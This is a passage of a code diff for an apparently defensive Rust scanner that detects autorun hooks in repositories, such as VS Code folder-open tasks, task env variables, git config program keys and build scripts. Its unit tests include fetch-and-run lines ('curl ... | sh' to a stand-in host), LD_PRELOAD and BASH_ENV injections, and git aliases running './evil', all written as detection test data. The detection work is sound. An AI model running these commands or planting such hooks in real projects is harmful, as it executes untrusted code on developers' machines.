+    if TASK_ENV_PATH_KEYS.contains(&key) && search_path_names_the_repo(value) {
+        return Some(Severity::High);
+    }
+    (key.ends_with("_BASE_URL")).then_some(Severity::Medium)
+}
+
+/// True when a search path (`a:b`, `a;b`) has a relative entry or one under the workspace folder.
+fn search_path_names_the_repo(value: &str) -> bool {
+    value
+        .replace("${env:", "${env_")
+        .split([':', ';'])
+        .map(str::trim)
+        // A single letter is a Windows drive; `.` is the folder itself.
+        .filter(|e| !e.is_empty() && !(e.len() == 1 && e.as_bytes()[0].is_ascii_alphabetic()))
+        .any(|e| {
+            e.starts_with("${workspaceFolder}")
+                || e.starts_with("${workspaceRoot}")
+                || e.starts_with("${cwd}")
+                || !e.starts_with(['/', '\\', '~', '$']) && e.as_bytes().get(1) != Some(&b':')
+        })
 }
 
 fn hides_output(task: &Map) -> bool {
@@ -1120,6 +1779,10 @@ const MAX_TASK_DEPTH: usize = 16;
 struct TaskWalk<'a> {
     by_label: HashMap<&'a str, &'a Map>,
     visits: usize,
+    /// The `options` next to the `tasks` array, which every task inherits.
+    file_options: Option<&'a Map>,
+    /// The `env` objects of the tasks the walk has reached and of their platform blocks.
+    envs: Vec<&'a Map>,
 }
 
 impl<'a> TaskWalk<'a> {
@@ -1144,10 +1807,28 @@ impl<'a> TaskWalk<'a> {
         if !label.is_empty() && !seen.insert(label) {
             return;
         }
-        out.extend(command_of(task));
+        // The options a command runs under, nearest first: its platform block, the task, the file.
+        let own = options_of(task);
+        out.extend(command_of(task, &[own, self.file_options]));
+        self.envs
+            .extend(own.and_then(|o| o.get("env")).and_then(Value::as_object));
         for os in ["windows", "linux", "osx"] {
             if let Some(block) = task.get(os).and_then(Value::as_object) {
-                out.extend(command_of(block));
+                let block_options = options_of(block);
+                let chain = [block_options, own, self.file_options];
+                // A block that sets only a shell runs the task's own command under it.
+                let command = command_of(block, &chain).or_else(|| {
+                    block_options
+                        .is_some_and(|o| o.contains_key("shell"))
+                        .then(|| command_of(task, &chain))
+                        .flatten()
+                });
+                out.extend(command);
+                self.envs.extend(
+                    block_options
+                        .and_then(|o| o.get("env"))
+                        .and_then(Value::as_object),
+                );
             }
         }
         let deps: Vec<&'a str> = match task.get("dependsOn") {
@@ -1163,8 +1844,59 @@ impl<'a> TaskWalk<'a> {
     }
 }
 
-/// The command line of a task or of one of its platform blocks, with the string it came from.
-fn command_of(task: &Map) -> Option<(String, String)> {
+/// The program a task's shell is: `options.shell.executable`, and `options.shell.args`, each from
+/// the nearest of `chain` that sets it. A path into the repo gets a leading `./`, so the file the
+/// task starts shows up as a file the command runs.
+fn shell_prefix(chain: &[Option<&Map>]) -> Option<String> {
+    let shells: Vec<&Map> = chain
+        .iter()
+        .flatten()
+        .filter_map(|o| o.get("shell").and_then(Value::as_object))
+        .collect();
+    let executable = shells
+        .iter()
+        .find_map(|s| s.get("executable").and_then(Value::as_str))?;
+    let args = shells
+        .iter()
+        .find_map(|s| s.get("args").and_then(Value::as_array));
+    let mut words = vec![shell_word(executable)];
+    words.extend(
+        args.into_iter()
+            .flatten()
+            .filter_map(|w| w.as_str().map(str::to_string)),
+    );
+    Some(join_args(&words))
+}
+
+/// A shell executable as a command word. A relative path (`${workspaceFolder}/x`, `x/y`, `.\x`)
+/// becomes `./x/y`; a bare name and an absolute path stay as they are.
+fn shell_word(executable: &str) -> String {
+    fn in_repo(path: &str) -> String {
+        let path = path.replace('\\', "/");
+        if path.starts_with("./") || path.starts_with("../") {
+            path
+        } else {
+            format!("./{path}")
+        }
+    }
+    let e = executable.trim();
+    if let Some(rest) = ["${workspaceFolder}", "${workspaceRoot}"]
+        .iter()
+        .find_map(|p| e.strip_prefix(p))
+    {
+        return in_repo(rest.trim_start_matches(['/', '\\']));
+    }
+    let absolute = e.starts_with(['/', '\\', '~', '$']) || e.as_bytes().get(1) == Some(&b':');
+    if absolute || !e.contains(['/', '\\']) {
+        e.to_string()
+    } else {
+        in_repo(e)
+    }
+}
+
+/// The command line of a task or of one of its platform blocks, with the string it came from. The
+/// shell of the nearest `options` in `chain` that names one starts it.
+fn command_of(task: &Map, chain: &[Option<&Map>]) -> Option<(String, String)> {
     let given = match task.get("command") {
         Some(Value::Object(o)) => o.get("value"),
         other => other,
@@ -1185,7 +1917,12 @@ fn command_of(task: &Map) -> Option<(String, String)> {
         _ => {
             if task.get("type").and_then(Value::as_str) == Some("npm") {
                 let script = task.get("script").and_then(Value::as_str)?;
-                return Some((format!("npm run {script}"), script.to_string()));
+                let line = format!("npm run {script}");
+                let line = match shell_prefix(chain) {
+                    Some(prefix) => format!("{prefix} {line}"),
+                    None => line,
+                };
+                return Some((line, script.to_string()));
             }
             return None;
         }
@@ -1202,6 +1939,9 @@ fn command_of(task: &Map) -> Option<(String, String)> {
         if !words.is_empty() {
             line = format!("{line} {}", join_args(&words));
         }
+    }
+    if let Some(prefix) = shell_prefix(chain) {
+        line = format!("{prefix} {line}");
     }
     Some((line, command))
 }
@@ -1236,7 +1976,12 @@ fn code_workspace(cx: &mut Cx) {
         .and_then(Value::as_array)
     {
         let dir = parent(cx.path).to_string();
-        tasks_from(cx, tasks, &dir);
+        let file_options = o
+            .get("tasks")
+            .and_then(Value::as_object)
+            .and_then(|t| t.get("options"))
+            .and_then(Value::as_object);
+        tasks_from(cx, tasks, file_options, &dir);
     }
 }
 
@@ -1249,8 +1994,9 @@ fn hides_vscode(key: &str) -> bool {
     )
 }
 
-/// Editor settings that name a program the editor or an extension runs: the explicit keys, and
-/// `.path`, `Path`, `.exe` or `.command` keys of the extensions listed here.
+/// Editor settings that name a program the editor or an extension runs. The list is explicit: a
+/// key that names a config file, an ignore list, a stub folder or a virtual environment is data,
+/// not a program, and is not rated.
 const PROGRAM_KEYS: &[&str] = &[
     "python.defaultInterpreterPath",
     "python.pythonPath",
@@ -1260,91 +2006,141 @@ const PROGRAM_KEYS: &[&str] = &[
     "git.path",
     "rust-analyzer.server.path",
     "go.goroot",
+    "clangd.path",
     "dart.sdkPath",
     "deno.path",
-    "php.validate.executablePath",
     "ruby.interpreter.commandPath",
-    "julia.executablePath",
-];
-const PROGRAM_PREFIXES: &[&str] = &[
-    "python.",
-    "rust-analyzer.",
-    "clangd.",
-    "go.",
-    "java.",
-    "php.",
-    "ruby.",
-    "dart.",
-    "deno.",
-    "julia.",
-    "lua.",
-    "perl.",
-    "cmake.",
-    "dotnet.",
-    "terraform.",
-    "eslint.",
-    "prettier.",
-    "typescript.",
-    "git.",
-    "npm.",
-    "yarn.",
-    "mypy-type-checker.",
-    "black-formatter.",
-    "pylint.",
-    "flake8.",
-    "ruff.",
-    "isort.",
 ];
 
+/// True for a settings key that names a program: the explicit keys, `*.executablePath`,
+/// `*.serverPath`, `terminal.integrated.shell.*`, `go.alternateTools` (a map of tool to program)
+/// and `terminal.integrated.profiles.*` (a map of profile to an object with a `path`).
 fn is_program_key(key: &str) -> bool {
     PROGRAM_KEYS.contains(&key)
-        || (PROGRAM_PREFIXES.iter().any(|p| key.starts_with(p))
-            && [".path", "Path", ".exe", ".command", ".runtime"]
+        || key.ends_with(".executablePath")
+        || key.ends_with(".serverPath")
+        || key.starts_with("terminal.integrated.shell.")
+        || key == "go.alternateTools"
+        || key.starts_with("terminal.integrated.profiles.")
+}
+
+/// The programs a program setting names, as `(name for the report, value)`: a string, the
+/// strings of an array, or what a map of tools or profiles holds.
+fn program_values(key: &str, value: &Value) -> Vec<(String, String)> {
+    fn strings(v: &Value) -> Vec<String> {
+        match v {
+            Value::Str(s) => vec![s.clone()],
+            Value::Array(a) => a
                 .iter()
-                .any(|s| key.ends_with(s)))
+                .filter_map(|w| w.as_str().map(str::to_string))
+                .collect(),
+            _ => Vec::new(),
+        }
+    }
+    let mut out = Vec::new();
+    if key == "go.alternateTools" {
+        for (name, v) in value
+            .as_object()
+            .into_iter()
+            .flat_map(|o| o.iter())
+            .take(50)
+        {
+            out.extend(strings(v).into_iter().map(|s| (format!("{key}.{name}"), s)));
+        }
+    } else if key.starts_with("terminal.integrated.profiles.") {
+        for (name, profile) in value
+            .as_object()
+            .into_iter()
+            .flat_map(|o| o.iter())
+            .take(50)
+        {
+            if let Some(path) = profile.as_object().and_then(|p| p.get("path")) {
+                out.extend(
+                    strings(path)
+                        .into_iter()
+                        .map(|s| (format!("{key}.{name}.path"), s)),
+                );
+            }
+        }
+    } else {
+        out.extend(strings(value).into_iter().map(|s| (key.to_string(), s)));
+    }
+    out
+}
+
+/// The folder a settings file's relative paths start from: the one above `.vscode` for
+/// `settings.json`, the one the file is in for a `*.code-workspace`.
+fn workspace_base(path: &str) -> &str {
+    if ends_with_ci(base(path), ".code-workspace") {
+        parent(path)
+    } else {
+        parent(parent(path))
+    }
+}
+
+/// The path of a workspace-relative `value` from the root of the repo, with `.` and `..`
+/// resolved, when `base` is the folder it starts from; `None` when it leaves the repo.
+fn workspace_target(value: &str, base: &str) -> Option<String> {
+    let rel = value
+        .trim()
+        .trim_start_matches("${workspaceFolder}")
+        .trim_start_matches("${workspaceRoot}");
+    let mut parts: Vec<&str> = base.split('/').filter(|c| !c.is_empty()).collect();
+    for part in rel.split(['/', '\\']) {
+        match part {
+            "" | "." => {}
+            ".." => {
+                parts.pop()?;
+            }
+            p => parts.push(p),
+        }
+    }
+    Some(parts.join("/"))
 }
 
 /// How much a program setting is worth: nothing for a bare name (found on PATH), HIGH for a
-/// path into the repo (the repo supplies the program), MEDIUM for a path outside it or one into
-/// an installed `node_modules`.
-fn program_value_severity(value: &str) -> Option<Severity> {
+/// path into the repo (the repo supplies the program, if the tree has it), MEDIUM for a path
+/// outside the repo or one into an installed `node_modules`. `base` is the folder a relative path
+/// starts from.
+fn program_value_severity(value: &str, base: &str) -> Option<Severity> {
     let v = value.trim();
     if v.is_empty() || !v.contains(['/', '\\']) && !v.starts_with(['.', '~', '$']) {
         return None;
     }
-    let outside = v.starts_with(['/', '~', '\\'])
+    let elsewhere = v.starts_with(['/', '~', '\\'])
         || v.as_bytes().get(1) == Some(&b':')
-        || v.starts_with("${userHome}")
-        || v.starts_with("${env:");
-    if outside {
+        || (v.starts_with("${")
+            && !v.starts_with("${workspaceFolder}")
+            && !v.starts_with("${workspaceRoot}"));
+    if elsewhere {
         return Some(Severity::Medium);
     }
-    let rel = v
-        .trim_start_matches("${workspaceFolder}")
-        .trim_start_matches("${workspaceRoot}")
-        .trim_start_matches(['/', '\\'])
-        .trim_start_matches("./");
-    if rel.starts_with("node_modules/") {
-        return Some(Severity::Medium);
+    match workspace_target(v, base) {
+        Some(target)
+            if !target
+                .split('/')
+                .any(|c| c.eq_ignore_ascii_case("node_modules")) =>
+        {
+            Some(Severity::High)
+        }
+        _ => Some(Severity::Medium),
     }
-    Some(Severity::High)
 }
 
 /// The rules of an editor settings object (`.vscode/settings.json`, or the `settings` block of a
 /// workspace file).
 fn settings_from(cx: &mut Cx, o: &Map) {
     let text = cx.text;
+    let base = workspace_base(cx.path);
     let mut worst: Option<(Severity, &str, String)> = None;
     for (key, value) in o.iter().filter(|(k, _)| is_program_key(k)).take(200) {
-        let Some(sev) = value.as_str().and_then(program_value_severity) else {
-            continue;
-        };
-        if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
-            worst = Some((
-                sev,
-                key,
-                format!("{key} = {}", value.as_str().unwrap_or("")),
-            ));
+        for (shown, program) in program_values(key, value) {
+            let Some(sev) = program_value_severity(&program, base) else {
+                continue;
+            };
+            if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
+                worst = Some((sev, key, format!("{shown} = {program}")));
+            }
         }
     }
     if let Some((severity, key, seen)) = worst {
@@ -1409,7 +2205,7 @@ fn devcontainer(cx: &mut Cx) {
     let Some(o) = v.as_object() else {
         return;
     };
-    let dir = if base(cx.path) == ".devcontainer.json" {
+    let dir = if base(cx.path).eq_ignore_ascii_case(".devcontainer.json") {
         parent(cx.path)
     } else {
         dir_above(cx.path, ".devcontainer").unwrap_or("")
@@ -1509,7 +2305,7 @@ fn command_value(v: &Value) -> Vec<String> {
 /// Makefile, `*.mk`, `*.m4` and `configure`: the lines that download and run, or decode and run.
 fn build_script(cx: &mut Cx) {
     let dir = parent(cx.path).to_string();
-    let dnl = base(cx.path).ends_with(".m4");
+    let dnl = ends_with_ci(base(cx.path), ".m4");
     for l in logical_lines(cx.text, dnl) {
         if matches!(
             shape::classify(&l.text),
@@ -1931,7 +2727,7 @@ fn rust_toolchain(cx: &mut Cx) {
 
 /// A wrapper properties file whose download URL (any of `keys`) is not on `official`. One finding.
 fn wrapper_properties(cx: &mut Cx, rule: &str, keys: &[&str], official: &str) {
-    for e in ini_entries(cx.text) {
+    for e in ini_entries(cx.text, false) {
         if !keys.contains(&e.key.as_str()) {
             continue;
         }
@@ -1956,7 +2752,7 @@ fn wrapper_properties(cx: &mut Cx, rule: &str, keys: &[&str], official: &str) {
 // Git files
 
 fn gitmodules(cx: &mut Cx) {
-    let entries = ini_entries(cx.text);
+    let entries = ini_entries(cx.text, true);
     let in_submodule = |e: &&Ini| {
         e.section
             .as_bytes()
@@ -2075,7 +2871,7 @@ fn git_config(cx: &mut Cx) {
     let mut include: Option<(usize, String)> = None;
     // The name of the current section, worked out once per section: a header can be huge.
     let mut current: Option<(Rc<str>, String)> = None;
-    for e in ini_entries(cx.text) {
+    for e in ini_entries(cx.text, true) {
         if current
             .as_ref()
             .is_none_or(|(s, _)| !Rc::ptr_eq(s, &e.section))
@@ -2103,13 +2899,28 @@ fn git_config(cx: &mut Cx) {
             ("core", "fsmonitor") => (!is_git_bool(value)).then_some(Severity::High),
             // husky points the hooks path at its own folder; its hooks are rated as files.
             ("core", "hookspath") if matches!(value, ".husky" | ".husky/_") => Some(Severity::Low),
-            ("core", "sshcommand" | "pager" | "editor" | "hookspath" | "askpass" | "gitproxy")
+            (
+                "core",
+                "sshcommand"
+                | "pager"
+                | "editor"
+                | "hookspath"
+                | "askpass"
+                | "gitproxy"
+                | "alternaterefscommand",
+            )
             | ("filter", "clean" | "smudge" | "process")
             | ("diff", "textconv" | "external" | "command")
             | ("merge", "driver")
             | ("sequence", "editor")
-            | ("gpg", "program")
+            | ("gpg", "program" | "defaultkeycommand")
+            | ("interactive", "difffilter")
+            | ("difftool" | "mergetool" | "browser" | "man" | "trailer", "cmd")
+            | ("trailer", "command")
+            | ("web", "browser")
             | ("remote", "uploadpack" | "receivepack") => Some(Severity::High),
+            // `pager.<command>` is a program, or a boolean that turns the pager on or off.
+            ("pager", _) => (!is_git_bool(value)).then_some(Severity::High),
             ("credential", "helper") => {
                 let first = value.split_whitespace().next().unwrap_or("");
                 (!SAFE_CREDENTIAL_HELPERS.contains(&first)).then_some(Severity::High)
@@ -2173,7 +2984,7 @@ const SAFE_CREDENTIAL_HELPERS: &[&str] = &[
 
 fn npmrc(cx: &mut Cx) {
     let mut hits: Vec<(usize, String)> = Vec::new();
-    for e in ini_entries(cx.text) {
+    for e in ini_entries(cx.text, false) {
         let key = e.key.to_ascii_lowercase();
         let value = unquote(&e.value);
         let flagged = match key.as_str() {
@@ -2209,7 +3020,7 @@ fn npmrc(cx: &mut Cx) {
 
 /// `yarnPath` of `.yarnrc.yml` or `yarn-path` of `.yarnrc`: Yarn runs that file instead of its own.
 fn yarn_path(cx: &mut Cx) {
-    let yml = base(cx.path) == ".yarnrc.yml";
+    let yml = base(cx.path).eq_ignore_ascii_case(".yarnrc.yml");
     for (i, raw) in cx.text.lines().enumerate() {
         let t = raw.trim();
         let value = if yml {
@@ -2752,8 +3563,11 @@ mod tests {
 
     #[test]
     fn husky_generated_helpers_are_not_hooks() {
-        let (s, out) = run(".husky/_/husky.sh", "echo helper\n");
+        // What husky writes is not a hook of the repo; a file it did not write there is.
+        let (s, out) = run(".husky/_/husky.sh", HUSKY_V9_SH);
         assert!(s.is_empty() && out.is_empty());
+        let (s, _) = run(".husky/_/husky.sh", "echo helper\n");
+        assert_eq!(commands(&s), ["echo helper"]);
         let (s, _) = run("husky/pre-commit", "npm test\n");
         assert!(s.is_empty());
     }
@@ -4057,6 +4871,835 @@ call post.bat</PreBuildEvent>
         assert_linear("Exec elements", 10_000, |n| {
             let _ = run("App.csproj", &project(n));
         });
+    }
+
+    // FW8b. N1: names are matched without regard to case.
+
+    fn outcome(path: &str, text: &str) -> Vec<String> {
+        let (s, out) = run(path, text);
+        let mut got: Vec<String> = s
+            .iter()
+            .map(|x| format!("{} {} {:?}", x.rule, x.command, x.trigger))
+            .collect();
+        got.extend(out.iter().map(|f| format!("{} {:?}", f.rule, f.severity)));
+        got
+    }
+
+    fn alternating(s: &str) -> String {
+        s.chars()
+            .enumerate()
+            .map(|(i, c)| {
+                if i % 2 == 0 {
+                    c.to_ascii_uppercase()
+                } else {
+                    c.to_ascii_lowercase()
+                }
+            })
+            .collect()
+    }
+
+    #[test]
+    fn every_name_is_matched_without_regard_to_case() {
+        let open_task =
+            r#"{"tasks":[{"label":"a","command":"make","runOptions":{"runOn":"folderOpen"}}]}"#;
+        let hidden = r#"{"files.exclude":{"**/.vscode":true}}"#;
+        let backend = "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"backend\"\nbackend-path = [\"_build\"]\n";
+        let wrapper = "distributionUrl=https://example.invalid/g.zip\n";
+        let cases: Vec<(&str, &str)> = vec![
+            ("package.json", LIFECYCLE),
+            (".vscode/tasks.json", open_task),
+            (".vscode/settings.json", hidden),
+            (
+                "x.code-workspace",
+                r#"{"settings":{"files.exclude":{"**/.vscode":true}}}"#,
+            ),
+            (
+                ".devcontainer/devcontainer.json",
+                r#"{"initializeCommand":"make"}"#,
+            ),
+            (".devcontainer.json", r#"{"initializeCommand":"make"}"#),
+            ("Makefile", "all:\n\tcurl https://example.invalid/x | sh\n"),
+            (".envrc", "make\n"),
+            (".pre-commit-config.yaml", PRE_COMMIT),
+            (".husky/pre-commit", "make\n"),
+            ("justfile", "build:\n  make\n"),
+            ("Taskfile.yml", TASKFILE),
+            (
+                "App.csproj",
+                r#"<Project><Target Name="x"><Exec Command="make" /></Target></Project>"#,
+            ),
+            ("setup.py", "from setuptools import setup\nsetup()\n"),
+            ("pyproject.toml", backend),
+            (".cargo/config.toml", "[build]\nrustc-wrapper = \"./w\"\n"),
+            ("gradle/wrapper/gradle-wrapper.properties", wrapper),
+            (".mvn/wrapper/maven-wrapper.properties", wrapper),
+            (
+                ".gitmodules",
+                "[submodule \"a\"]\n\tpath = a\n\turl = https://example.invalid/a.git\n",
+            ),
+            (".gitattributes", "*.dat filter=scrub\n"),
+            (".git/config", "[core]\n\tfsmonitor = ./x\n"),
+            (".git/config.worktree", "[core]\n\tfsmonitor = ./x\n"),
+            (".npmrc", "ignore-scripts=false\n"),
+            (".yarnrc.yml", "yarnPath: ./x.js\n"),
+            ("build.rs", ""),
+            (".mvn/extensions.xml", ""),
+        ];
+        for (path, text) in cases {
+            let want = outcome(path, text);
+            assert!(
+                !want.is_empty(),
+                "{path} gives nothing, so it proves nothing"
+            );
+            for variant in [path.to_ascii_uppercase(), alternating(path)] {
+                assert_eq!(outcome(&variant, text), want, "{variant}");
+            }
+        }
+        // An installed dependency is skipped whatever the case of the folder.
+        let (s, _) = run("NODE_MODULES/x/Package.json", LIFECYCLE);
+        assert!(s.is_empty());
+    }
+
+    #[test]
+    fn git_hooks_are_matched_without_regard_to_case() {
+        let mut out = Vec::new();
+        entry_findings(
+            &[
+                ".GIT/Hooks/pre-commit",
+                "sub/.Git/HOOKS/pre-push",
+                ".GIT/HOOKS/PRE-COMMIT.SAMPLE",
+                ".git/hooks/applypatch-msg.Sample",
+            ],
+            &mut out,
+        );
+        assert_eq!(
+            out.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(),
+            [".GIT/Hooks/pre-commit", "sub/.Git/HOOKS/pre-push"]
+        );
+        assert!(is_git_hook(".GIT/hooks/Pre-Commit"));
+        // A stock stub under a differently cased hook name is still lowered.
+        assert_eq!(
+            hook_severity(".GIT/HOOKS/PRE-COMMIT", PRE_COMMIT_STUB),
+            Severity::Low
+        );
+        assert_eq!(
+            hook_severity(".Git/Hooks/Pre-Push", LFS_STUB),
+            Severity::Low
+        );
+        // The hook file itself is not read as another kind of file.
+        let (s, out) = run(
+            ".GIT/HOOKS/pre-commit",
+            "curl https://example.invalid/x | sh\n",
+        );
+        assert!(s.is_empty() && out.is_empty());
+    }
+
+    // N6: VS Code task options.
+
+    fn open_task(extra: &str) -> String {
+        format!(
+            r#"{{"version":"2.0.0","tasks":[{{"label":"t","command":"echo hi","runOptions":{{"runOn":"folderOpen"}}{extra}}}]}}"#
+        )
+    }
+
+    fn runs_file(s: &[Surface], file: &str) -> bool {
+        s.iter()
+            .any(|x| shape::files_run(&x.command).contains(&file.to_string()))
+    }
+
+    #[test]
+    fn a_task_shell_inside_the_repo_is_a_file_the_task_runs() {
+        for extra in [
+            r#","options":{"shell":{"executable":"./tools/sh","args":["-c"]}}"#,
+            r#","options":{"shell":{"executable":"${workspaceFolder}/tools/sh"}}"#,
+            r#","options":{"shell":{"executable":"${workspaceRoot}\\tools/sh"}}"#,
+            r#","options":{"shell":{"executable":"tools/sh"}}"#,
+            r#","linux":{"options":{"shell":{"executable":"./tools/sh"}}}"#,
+            r#","osx":{"command":"echo hi","options":{"shell":{"executable":"tools/sh"}}}"#,
+            r#","windows":{"options":{"shell":{"executable":"./tools/sh"}}}"#,
+        ] {
+            let (s, _) = run(".vscode/tasks.json", &open_task(extra));
+            assert!(runs_file(&s, "tools/sh"), "{extra}: {:?}", commands(&s));
+        }
+        // At file level, and in the tasks block of a workspace file.
+        let file_level = r#"{"options":{"shell":{"executable":"./tools/sh"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", file_level);
+        assert!(runs_file(&s, "tools/sh"), "{:?}", commands(&s));
+        let workspace = r#"{"tasks":{"options":{"shell":{"executable":"./tools/sh"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}}"#;
+        let (s, _) = run("a.code-workspace", workspace);
+        assert!(runs_file(&s, "tools/sh"), "{:?}", commands(&s));
+        // A task that does not run on open starts nothing.
+        let manual = r#"{"tasks":[{"label":"t","command":"echo hi","options":{"shell":{"executable":"./tools/sh"}}}]}"#;
+        assert!(run(".vscode/tasks.json", manual).0.is_empty());
+    }
+
+    #[test]
+    fn a_system_shell_in_a_task_leaves_the_command_as_it_was() {
+        let extra = r#","options":{"shell":{"executable":"/bin/bash","args":["-c"]}}"#;
+        let (s, _) = run(".vscode/tasks.json", &open_task(extra));
+        assert_eq!(commands(&s), ["/bin/bash -c echo hi"]);
+        assert!(s.iter().all(|x| shape::files_run(&x.command).is_empty()));
+        // The shell's own download-and-run is still seen.
+        let evil = r#"{"tasks":[{"label":"t","command":"curl https://example.invalid/x | sh","options":{"shell":{"executable":"bash","args":["-c"]}},"runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (s, _) = run(".vscode/tasks.json", evil);
+        assert_eq!(shape::classify(&s[0].command), Shape::FetchExec);
+    }
+
+    fn task_env(extra: &str) -> Vec<Finding> {
+        run(".vscode/tasks.json", &open_task(extra)).1
+    }
+
+    fn env_at(place: &str, key: &str, value: &str) -> String {
+        let env = format!(r#""env":{{"{key}":"{value}"}}"#);
+        match place {
+            "task" => format!(r#","options":{{{env}}}"#),
+            "linux" => format!(r#","linux":{{"options":{{{env}}}}}"#),
+            _ => unreachable!(),
+        }
+    }
+
+    #[test]
+    fn task_env_keys_that_run_code_are_critical() {
+        for (key, value) in [
+            ("BASH_ENV", "./env.sh"),
+            ("ENV", "./env.sh"),
+            ("ZDOTDIR", "./z"),
+            ("LD_PRELOAD", "./x.so"),
+            ("DYLD_INSERT_LIBRARIES", "./x.dylib"),
+            ("GIT_SSH_COMMAND", "./ssh"),
+            ("GIT_ASKPASS", "./ask"),
+            ("SSH_ASKPASS", "./ask"),
+            ("GIT_EXEC_PATH", "./g"),
+            ("GIT_CONFIG_COUNT", "1"),
+            ("GIT_CONFIG_KEY_0", "core.pager"),
+            ("PYTHONSTARTUP", "./s.py"),
+            ("NODE_OPTIONS", "--require ./x.js"),
+            ("PERL5OPT", "-Mx"),
+            ("RUBYOPT", "-r./x"),
+            ("JAVA_TOOL_OPTIONS", "-javaagent:./a.jar"),
+            ("ANTHROPIC_BASE_URL", "https://example.invalid/v1"),
+        ] {
+            for place in ["task", "linux"] {
+                let out = task_env(&env_at(place, key, value));
+                let f = named(&out, "autorun.vscode-task-env");
+                assert_eq!(f.severity, Severity::Critical, "{key} {place}");
+                assert!(f.seen.contains(key), "{}", f.seen);
+            }
+            // A lower-case spelling is the same key on Windows.
+            let out = task_env(&env_at("task", &key.to_ascii_lowercase(), value));
+            assert_eq!(
+                named(&out, "autorun.vscode-task-env").severity,
+                Severity::Critical,
+                "{key} in lower case"
+            );
+        }
+        // At file level, for a task that runs on open.
+        let text = r#"{"options":{"env":{"LD_PRELOAD":"./x.so"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#;
+        let (_, out) = run(".vscode/tasks.json", text);
+        assert_eq!(
+            named(&out, "autorun.vscode-task-env").severity,
+            Severity::Critical
+        );
+    }
+
+    #[test]
+    fn task_env_keys_that_search_the_repo_are_high() {
+        for (key, value) in [
+            ("PYTHONPATH", "${workspaceFolder}/src"),
+            ("PATH", "./bin:${env:PATH}"),
+            ("PATH", "${workspaceFolder}/node_modules/.bin:/usr/bin"),
+            ("LD_LIBRARY_PATH", "./lib"),
+            ("PERL5LIB", "lib"),
+            ("RUBYLIB", "./lib"),
+        ] {
+            let out = task_env(&env_at("task", key, value));
+            assert_eq!(
+                named(&out, "autorun.vscode-task-env").severity,
+                Severity::High,
+                "{key}={value}"
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_task_env_is_clean() {
+        for (key, value) in [
+            ("NODE_OPTIONS", "--max-old-space-size=4096"),
+            ("ENV", "production"),
+            ("NODE_ENV", "development"),
+            ("DEBUG", "app:*"),
+            ("PATH", "/usr/local/bin:${env:PATH}"),
+            ("LD_LIBRARY_PATH", "/usr/lib"),
+            ("PYTHONPATH", "/opt/py"),
+            ("JAVA_TOOL_OPTIONS", "-Xmx2g"),
+        ] {
+            let out = task_env(&env_at("task", key, value));
+            assert!(
+                !rules(&out).contains(&"autorun.vscode-task-env"),
+                "{key}={value}"
+            );
+        }
+        // Another service's base URL is MEDIUM, as in the agent settings.
+        let out = task_env(&env_at("task", "API_BASE_URL", "http://localhost:3000"));
+        assert_eq!(
+            named(&out, "autorun.vscode-task-env").severity,
+            Severity::Medium
+        );
+        // A task that does not run on open has its env left alone.
+        let manual =
+            r#"{"tasks":[{"label":"t","command":"x","options":{"env":{"LD_PRELOAD":"./x.so"}}}]}"#;
+        assert!(run(".vscode/tasks.json", manual).1.is_empty());
+    }
+
+    // N12: more git config keys.
+
+    #[test]
+    fn more_git_config_keys_that_name_a_program_are_high() {
+        for text in [
+            "[pager]\n\tlog = ./evil\n",
+            "[pager]\n\tdiff = sh evil.sh\n",
+            "[gpg \"ssh\"]\n\tdefaultKeyCommand = ./k\n",
+            "[gpg.ssh]\n\tdefaultKeyCommand = ./k\n",
+            "[interactive]\n\tdiffFilter = ./f\n",
+            "[difftool \"x\"]\n\tcmd = ./d\n",
+            "[mergetool \"x\"]\n\tcmd = ./m\n",
+            "[trailer \"t\"]\n\tcommand = ./t\n",
+            "[trailer \"t\"]\n\tcmd = ./t\n",
+            "[browser \"b\"]\n\tcmd = ./b\n",
+            "[web]\n\tbrowser = ./b\n",
+            "[man \"m\"]\n\tcmd = ./m\n",
+            "[core]\n\talternateRefsCommand = ./a\n",
+            "[Pager]\n\tLOG = ./x\n",
+            // An alias whose value continues on the next line.
+            "[alias]\n\tx = \\\n!./evil\n",
+            "[alias]\n\tx = \\\n    !./evil\n",
+            "[alias]\n\tx = \\\r\n!./evil\r\n",
+            "[alias]\n\tx = ! \\\n./evil\n",
+            "[core]\n\tsshCommand = ./a \\\n  -x\n",
+        ] {
+            let (_, out) = run(".git/config", text);
+            assert_eq!(
+                named(&out, "autorun.git-config-command").severity,
+                Severity::High,
+                "{text:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_git_config_continuation_keeps_the_line_of_its_first_physical_line() {
+        let text = "[core]\n\tbare = false\n[alias]\n\tx = \\\n!./evil\n\ty = z\n";
+        let (_, out) = run(".git/config", text);
+        let f = named(&out, "autorun.git-config-command");
+        assert_eq!(f.line, 4);
+        assert!(f.seen.contains("evil"), "{}", f.seen);
+    }
+
+    #[test]
+    fn ordinary_git_config_values_for_the_new_keys_are_clean() {
+        for text in [
+            "[pager]\n\tlog = false\n\tdiff = true\n",
+            "[alias]\n\tco = checkout\n\tlg = log --oneline \\\n\t\t--graph\n",
+            "[web]\n\tfoo = bar\n",
+            "[interactive]\n\tsingleKey = true\n",
+            "[difftool \"x\"]\n\tprompt = false\n",
+            "[core]\n\tbare = false\n",
+        ] {
+            let (_, out) = run(".git/config", text);
+            assert!(out.is_empty(), "{text:?}: {out:?}");
+        }
+    }
+
+    // N13: stub trust.
+
+    #[test]
+    fn a_pre_commit_stub_trusts_only_an_absolute_python_and_the_default_config() {
+        let low = |stub: &str| hook_severity(".git/hooks/pre-commit", stub) == Severity::Low;
+        assert!(low(PRE_COMMIT_STUB));
+        for python in [
+            "/usr/bin/python3",
+            "/home/u/.pyenv/versions/3.11.4/bin/python3.11",
+            "/opt/homebrew/bin/python3",
+            "'/Users/Some One/.venv/bin/python'",
+        ] {
+            let stub = PRE_COMMIT_STUB.replace("/usr/bin/python3", python);
+            assert!(low(&stub), "{python}");
+        }
+        for python in [
+            "./evil",
+            "evil",
+            "../bin/python3",
